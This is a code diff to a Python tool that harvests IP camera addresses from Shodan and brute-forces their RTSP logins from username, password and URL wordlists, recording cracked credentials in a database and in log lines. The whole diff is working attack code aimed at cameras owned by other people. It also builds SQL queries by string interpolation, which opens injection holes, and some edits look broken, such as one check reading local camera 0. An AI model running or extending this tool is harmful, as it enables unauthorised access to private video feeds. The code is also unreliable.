@@ -1,5 +1,6 @@
 import base64
 import itertools
+import json
 import os
 import random
 import socket
@@ -55,12 +56,12 @@ class DatabaseConnector(metaclass=Singleton):
             logging.error(f'Error on connect to database: {e}')
             raise e
 
-    def insert_into_cameras(self, ip, port, user, password, url, city, country_code):
+    def insert_into_cameras(self, ip, port, user, password, url, city, country_code, country_name, region_code):
         city = city.replace("'", "").replace('"', '').replace(';', '')
         c = self.conn.cursor()
         c.execute(f'''
-            INSERT INTO public.cameras (ip, port, "user", "password", url, active, city, country_code, added_at, updated_at, id) VALUES('{ip}', {port}, '{user}', '{password}', '{url}', 0, '{city}', '{country_code}', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, DEFAULT);
-        '''.strip(), (ip, port, user, password, url, city, country_code))
+            INSERT INTO public.cameras (ip, port, "user", "password", url, active, city, country_code, country_name, region_code, added_at, updated_at, id) VALUES('{ip}', {port}, '{user}', '{password}', '{url}', 0, '{city}', '{country_code}, {country_name}, {region_code}', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, DEFAULT);
+        '''.strip())
         self.conn.commit()
 
     def insert_into_runs(self, run_name):
@@ -73,7 +74,7 @@ class DatabaseConnector(metaclass=Singleton):
     def get_random_from_db(self):
         c = self.conn.cursor()
         c.execute('''
-            SELECT * FROM cameras WHERE active = 1 ORDER BY RANDOM()
+            SELECT * FROM cameras WHERE active = 0 ORDER BY RANDOM()
         '''.strip())
         result = c.fetchall()
         return result
@@ -99,10 +100,20 @@ class DatabaseConnector(metaclass=Singleton):
 
     def update_from_db_values(self, host, port, user, password, rtsp_string, active):
         c = self.conn.cursor()
-        c.execute('''INSERT OR REPLACE INTO cameras (ip, port, user, password, url, active, updated_at) VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP); '''.strip(), (
-            host, port, user, password, rtsp_string, active
-        ))
+        query = f'''
+            INSERT INTO cameras (ip, port, "user", password, url, active, updated_at)
+            VALUES ('{host}', {port}, '{user}', '{password}', '{rtsp_string}', {active}, CURRENT_TIMESTAMP)
+            ON CONFLICT (ip, port)
+            DO UPDATE SET
+                "user" = EXCLUDED."user",
+                password = EXCLUDED.password,
+                url = EXCLUDED.url,
+                active = EXCLUDED.active,
+                updated_at = EXCLUDED.updated_at;
+            '''.strip()
+        c.execute(query)
         self.conn.commit()
+        logging.debug(f'Updated {host}:{port} with {user}:{password} and {rtsp_string}')
 
 
 db = DatabaseConnector()
@@ -118,14 +129,35 @@ def write_image_to_file(ss, h, p):
 def check_rtsp_connection_by_host(host, port, user, password, rtsp_string):
     rtsp_url = rtsp_string.format(user, password, host, port)
     logging.debug(f'{rtsp_url}')
+    vcap = cv2.VideoCapture(0)
+    try:
+        ret, frame = vcap.read()
+        if not ret:
+            logging.debug(f'No frame for {rtsp_url}')
+            return None
+        logging.info(f'[!!] Connected to camera with RTSP URL: {rtsp_url}, user: {user}, password: {password}')
+        db.update_from_db_values(host, port, user, password, rtsp_url, 1)
+        return rtsp_url
+    except Exception as e:
+        logging.error(f'Error: {e}')
+        return None
+    finally:
+        logging.debug(f'Releasing {rtsp_url}')
+        vcap.release()
+
+
+def check_rtsp_connection(host, port, rtsp_string):
+    rtsp_url = rtsp_string.format('', '', host, port)
+    rtsp_url = rtsp_url.replace('rtsp://:@', 'rtsp://')
+    logging.debug(f'{rtsp_url}')
     vcap = cv2.VideoCapture(rtsp_url)
     try:
         ret, frame = vcap.read()
         if not frame:
             logging.debug(f'No frame for {rtsp_url}')
             return None
-        logging.info(f'[!!] Connected to camera with RTSP URL: {rtsp_url}, user: {user}, password: {password}')
-        db.update_from_db_values(host, port, user, password, rtsp_url, 1)
+        logging.info(f'[!!] Connected to camera with RTSP URL: {rtsp_url}')
+        db.update_from_db_values(host, port, None, None, rtsp_url, 1)
         return rtsp_url
     except Exception as e:
         logging.error(f'Error: {e}')
@@ -167,6 +199,9 @@ def thread_add_cameras_on_db(shodan_key=None):
     cams_added = 0
     try:
         for banner in results:
+            # save banner on disk
+            with open(f'banner/{banner.get("ip_str")}_{banner.get("port")}.json', 'w') as f:
+                f.write(json.dumps(banner, indent=4))
             ip, port = banner.get('ip_str'), banner.get('port')
             db_response = db.search_on_db(ip, port)
             if db_response:
@@ -174,7 +209,9 @@ def thread_add_cameras_on_db(shodan_key=None):
             else:
                 city = banner.get('location').get('city')
                 country_code = banner.get('location').get('country_code')
-                db.insert_into_cameras(ip, port, '.', '.', '.', city, country_code)
+                country_name = banner.get('location').get('country_name')
+                region_code = banner.get('location').get('region_code')
+                db.insert_into_cameras(ip, port, '.', '.', '.', city, country_code, country_name, region_code)
                 logging.debug(f'{ip}:{port} added')
                 cams_added += 1
             if banner.get('screenshot'):
@@ -188,6 +225,7 @@ def thread_add_cameras_on_db(shodan_key=None):
     except Exception as e:
         logging.error(f'Error: {e}')
         return cams_added
+
 
 def thread_test_cameras(users_wordlist, passwords_wordlist, rtsp_urls_wordlist, randomize):
     logging.info(f'Starting thread_test_cameras')
@@ -205,7 +243,7 @@ def thread_test_cameras(users_wordlist, passwords_wordlist, rtsp_urls_wordlist, 
     logging.debug(f'Testing {len(cameras)} cameras')
     camera_combinations = itertools.product(rtsp_url_type, camera_users, camera_passwords, cameras)
     for url, user, password, camera in camera_combinations:
-        ip, port = camera[1], camera[2]
+        ip, port = camera[0], camera[1]
         url_login = url.format(user, password, ip, port)
         check_rtsp_connection_by_host(ip, port, user, password, url_login)
     logging.info(f'Executors: finished in thread_test_cameras')
@@ -215,10 +253,8 @@ def parse_arguments() -> argparse.Namespace:
     parser = argparse.ArgumentParser()
 
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('--start_search', action='store_true', help='Start searching for cameras on Shodan',
-                       default=False)
+    group.add_argument('--start_search', action='store_true', help='Start searching for cameras on Shodan', default=False)
     group.add_argument('--start_check', action='store_true', help='Start testing cameras on DB', default=False)
-
     parser.add_argument('--threads', action='store', help='Number of threads to check cams', default=1, type=int)
     parser.add_argument('--users', action='store', help='Path to users file', default='users_small.txt')
     parser.add_argument('--passwords', action='store', help='Path to passwords file', default='passwords_small.txt')
